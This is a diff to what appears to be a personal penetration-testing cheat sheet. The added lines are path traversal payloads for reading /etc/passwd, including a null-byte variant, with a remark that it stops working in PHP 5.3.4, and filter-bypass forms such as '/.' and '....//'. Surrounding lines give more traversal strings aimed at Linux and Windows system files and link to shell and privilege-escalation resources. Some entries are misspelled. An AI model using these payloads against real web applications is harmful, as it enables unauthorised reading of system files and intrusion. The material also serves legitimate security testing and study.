@@ -1,7 +1,7 @@
 https://fornex.com/my/vps/
 
 ####################### sources ###################
-revshells.com                                                                     # shells generator
+                                                                    # shells generator
 https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  # interactive bash fully TTY
 https://gtfobins.github.io/                                                       # bypass local security restrictions in Linux
 
@@ -43,6 +43,12 @@ curl http://site.com/images/favico.ico | md5sum                                 
 ../../../../etc/passw                                                              # Path traversal for Linux
 ../../../../boot.ini                                                               # Path traversal for Win
 ../../../../windows/win.ini                                                        # Path traversal for Win
+
+../../../../etc/passw%00                                                           # By adding the null-byte %00 or 0x00 we tell the  include function to ignore anything after the null byte
+NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
+
+../../../../etc/passwd/.                                                           # Be adding /. bypass filter
+....//....//....//....//....//                                                     # Bypss filter by replace  
 
 ######################## Enumerate privileges #######################################
 ~~~~~~~~~~~~~~~~~~~~~~~~         win          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
